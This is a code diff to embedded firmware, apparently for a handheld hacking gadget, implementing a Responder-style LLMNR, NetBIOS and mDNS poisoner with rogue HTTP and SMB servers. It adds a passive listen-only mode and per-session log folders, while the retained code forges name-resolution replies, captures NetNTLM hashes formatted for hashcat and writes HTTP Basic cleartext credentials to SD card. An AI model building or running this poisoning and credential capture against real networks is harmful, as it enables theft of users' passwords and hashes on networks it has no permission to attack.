@@ -32,6 +32,8 @@ struct RspEvt { uint8_t proto; uint32_t src; char name[40]; };  // proto:0 LLMNR
 static volatile RspEvt s_ring[24];
 static volatile uint8_t s_rHead = 0, s_rTail = 0;
 static uint8_t s_ourIp[4];
+static volatile bool s_passive = false;   // listen-only: log queries, never answer
+static String  s_dir;                      // per-session SD folder /apps/responder/NNN
 
 static void rspPush(uint8_t proto, uint32_t src, const char* name) {
     uint8_t nh = (s_rHead + 1) % 24;
@@ -101,7 +103,7 @@ static void llmnrRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_a
     if (p->len >= 12 && !(((uint8_t*)p->payload)[2] & 0x80)) {
         uint8_t* q = (uint8_t*)p->payload; char name[40];
         int qlen = dnsParseName(q, p->len, name, sizeof(name));
-        if (qlen > 0 && qlen <= 100) { dnsSendAnswer(pcb, q, qlen, 0x8000, addr, port); rspPush(0, ipToU32(addr), name); }
+        if (qlen > 0 && qlen <= 100) { if (!s_passive) dnsSendAnswer(pcb, q, qlen, 0x8000, addr, port); rspPush(0, ipToU32(addr), name); }
     }
     pbuf_free(p);
 }
@@ -110,7 +112,7 @@ static void mdnsRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_ad
     if (p->len >= 12 && !(((uint8_t*)p->payload)[2] & 0x80)) {
         uint8_t* q = (uint8_t*)p->payload; char name[40];
         int qlen = dnsParseName(q, p->len, name, sizeof(name));
-        if (qlen > 0 && qlen <= 100) { dnsSendAnswer(pcb, q, qlen, 0x8400, addr, port); rspPush(2, ipToU32(addr), name); }
+        if (qlen > 0 && qlen <= 100) { if (!s_passive) dnsSendAnswer(pcb, q, qlen, 0x8400, addr, port); rspPush(2, ipToU32(addr), name); }
     }
     pbuf_free(p);
 }
@@ -128,8 +130,10 @@ static void nbtRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p, const ip_add
             out[n++]=0; out[n++]=0; out[n++]=0; out[n++]=0xE5;
             out[n++]=0x00; out[n++]=0x06; out[n++]=0x00; out[n++]=0x00;
             memcpy(out + n, s_ourIp, 4); n += 4;
-            struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
-            if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
+            if (!s_passive) {
+                struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
+                if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
+            }
             rspPush(1, ipToU32(addr), name[0] ? name : "<nbt>");
         }
     }
@@ -156,12 +160,16 @@ static String utf16leToAscii(const uint8_t* d, int n) { String s; for (int i=0;i
 static uint32_t s_caps = 0, s_capsV1 = 0;
 static String   s_seenKey[8];        // dedup: last 8 NT-response keys
 static uint8_t  s_seenN = 0;
-static void writeHash(const String& line) {
-    File f = SD.open(String(SD_DIR_RESPONDER) + "/hashes.txt", FILE_APPEND);
+// All per-session files live in s_dir (/apps/responder/NNN): hashes.txt (hashcat-
+// ready NetNTLM only), creds.txt (HTTP Basic cleartext), captures.csv (summary),
+// queries.csv (every observed name query).
+static void appendLine(const char* fname, const String& line) {
+    File f = SD.open(s_dir + "/" + fname, FILE_APPEND);
     if (f) { f.println(line); f.close(); }
 }
+static void writeHash(const String& line) { appendLine("hashes.txt", line); }
 static void logCred(const char* proto, const String& src, const String& who) {
-    File c = SD.open(String(SD_DIR_RESPONDER) + "/log.csv", FILE_APPEND);
+    File c = SD.open(s_dir + "/captures.csv", FILE_APPEND);
     if (c) { c.printf("%lu,%s,%s,%s\n", (unsigned long)millis(), proto, src.c_str(), who.c_str()); c.close(); }
 }
 static String parseType3(const uint8_t* dec, int dl, const String& src, const char* proto) {
@@ -250,15 +258,21 @@ static int findNtlmssp(const uint8_t* b, int n) {
 static const char* WPAD_PAC = "function FindProxyForURL(url,host){return \"DIRECT\";}";
 
 void runResponder(char* args) {
-    (void)args;
     DisplayManager& dm = displayManager;
     if (WiFi.status() != WL_CONNECTED) {
         dm.clearScreen(); dm.setTextColor(TFT_RED); dm.println("Not connected. Run `cw` first."); delay(1800); return;
     }
+    { String a = args ? String(args) : ""; a.trim(); a.toLowerCase(); s_passive = (a=="passive" || a=="p"); }
     IPAddress ip = WiFi.localIP();
     for (int i=0;i<4;i++) s_ourIp[i]=ip[i];
     s_rHead=s_rTail=0; s_caps=0; s_capsV1=0;
     for (int i=0;i<8;i++) s_seenKey[i]=""; s_seenN=0;
+
+    // per-session folder /apps/responder/NNN
+    { int idx=1; char p[48];
+      do { snprintf(p,sizeof(p),"%s/%03d",SD_DIR_RESPONDER,idx++); s_dir=String(p); }
+      while (SD.exists(s_dir) && idx<1000);
+      SD.mkdir(s_dir); }
 
     struct udp_pcb *llmnr=nullptr,*nbt=nullptr,*mdns=nullptr;
     ip_addr_t m1,m2; IP_ADDR4(&m1,224,0,0,252); IP_ADDR4(&m2,224,0,0,251);
@@ -268,26 +282,27 @@ void runResponder(char* args) {
     nbt  =udp_new(); if(nbt){   udp_bind(nbt,  IP_ANY_TYPE,137);  udp_recv(nbt,  nbtRecv,  nullptr);}
     UNLOCK_TCPIP_CORE();
 
-    WiFiServer http(80);  http.begin();
-    WiFiServer smb(445);  smb.begin();
+    // capture servers only in ACTIVE mode (passive = listen-only, transmit nothing)
+    WiFiServer http(80), smb(445);
+    if (!s_passive) { http.begin(); smb.begin(); }
     String type2 = ntlmType2B64();
 
     const int statY=110, lblY=130, listY=146, capY=192;
     auto drawStatic=[&](){
         dm.clearScreen();
-        dm.setTextColor(TFT_RED);   dm.setCursor(10,40);  dm.printText("[RESPONDER]");
-        dm.setTextColor(0xFD20);    dm.setCursor(112,40); dm.printText("[EXP]");
-        dm.setTextColor(0x7BEF);    dm.setCursor(10,58);  dm.printText("LLMNR/NBT/mDNS + HTTP/SMB NTLM");
+        dm.setTextColor(TFT_RED);   dm.setCursor(10,40);  dm.printText(s_passive?"[RESPONDER] LISTEN":"[RESPONDER]");
+        dm.setTextColor(0xFD20);    dm.setCursor(s_passive?176:112,40); dm.printText("[EXP]");
+        dm.setTextColor(0x7BEF);    dm.setCursor(10,58);  dm.printText(s_passive?"PASSIVE - log name queries, no reply":"LLMNR/NBT/mDNS + HTTP/SMB NTLM");
         dm.setTextColor(TFT_WHITE); dm.setCursor(10,76);  dm.printText("me  "+ip.toString());
-        dm.setTextColor(0x5AEB);    dm.setCursor(10,92);  dm.printText("SD /apps/responder/");
+        dm.setTextColor(0x5AEB);    dm.setCursor(10,92);  dm.printText("SD "+s_dir);
         dm.setTextColor(0x5AEB);    dm.setCursor(10,lblY);dm.printText("recent name queries:");
-        dm.setTextColor(0x7BEF);    dm.setCursor(10,214); dm.printText("[q] stop  hashcat -m 5600/5500");
+        dm.setTextColor(0x7BEF);    dm.setCursor(10,214); dm.printText(s_passive?"[q] stop   (listen-only, no capture)":"[q] stop  hashcat -m 5600/5500");
     };
     drawStatic();
 
     uint32_t llmnrN=0,nbtN=0,mdnsN=0,lastDraw=0;
     char lastNames[3][40]={{0},{0},{0}}; char lastCap[52]={0}; bool stop=false;
-    File poisonLog = SD.open(String(SD_DIR_RESPONDER)+"/poison.csv", FILE_APPEND);   // kept open (STA sockets = GDMA-safe)
+    File poisonLog = SD.open(s_dir+"/queries.csv", FILE_APPEND);   // kept open (STA sockets = GDMA-safe)
 
     auto handleHttp=[&](WiFiClient& cl){
         cl.setTimeout(250);   // bound each blocking read so [q] stays responsive
@@ -308,7 +323,7 @@ void runResponder(char* args) {
             uint8_t dec[128]; size_t ol=0; String b=auth.substring(1);
             if (mbedtls_base64_decode(dec,sizeof(dec),&ol,(const unsigned char*)b.c_str(),b.length())==0 && ol>0) {
                 dec[ol<127?ol:127]='\0'; String up=String((char*)dec);
-                writeHash("[HTTP-BASIC] "+src+"  "+up); logCred("http-basic",src,up);
+                appendLine("creds.txt", src+"  "+up); logCred("http-basic",src,up);
                 snprintf(lastCap,sizeof(lastCap),"BASIC %s",up.c_str());
             }
             cl.print("HTTP/1.1 200 OK\r\nContent-Length:2\r\nConnection:close\r\n\r\nok");
@@ -375,8 +390,10 @@ void runResponder(char* args) {
             IPAddress s(e.src);
             if (poisonLog) poisonLog.printf("%lu,%s,%s,%s\n",(unsigned long)millis(),pn,s.toString().c_str(),e.name);
         }
-        WiFiClient hc=http.available(); if (hc) handleHttp(hc);
-        WiFiClient sc=smb.available();  if (sc) handleSmb(sc);
+        if (!s_passive) {
+            WiFiClient hc=http.available(); if (hc) handleHttp(hc);
+            WiFiClient sc=smb.available();  if (sc) handleSmb(sc);
+        }
 
         uint32_t now=millis();
         if (now-lastDraw>=400 && !displayManager.isBlocked()) {
@@ -389,8 +406,9 @@ void runResponder(char* args) {
             dm.fillRect(10,listY,SCREEN_WIDTH-20,3*13,TFT_BLACK); dm.setTextColor(0xC618);
             for (int i=0;i<3;i++) if (lastNames[i][0]) { dm.setCursor(10,listY+i*13); dm.printText(String(lastNames[i])); }
             dm.fillRect(10,capY,SCREEN_WIDTH-20,14,TFT_BLACK); dm.setCursor(10,capY);
-            if (lastCap[0]) { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ")+lastCap); }
-            else            { dm.setTextColor(0x5AEB);     dm.printText("waiting for auth (HTTP/SMB)..."); }
+            if (lastCap[0])       { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ")+lastCap); }
+            else if (s_passive)   { dm.setTextColor(0x5AEB);     dm.printText("listen-only - no responses sent"); }
+            else                  { dm.setTextColor(0x5AEB);     dm.printText("waiting for auth (HTTP/SMB)..."); }
             if (poisonLog) poisonLog.flush();   // persist queued rows periodically
         }
         if (inputHandler.getKeyboardInput()=='q') stop=true;
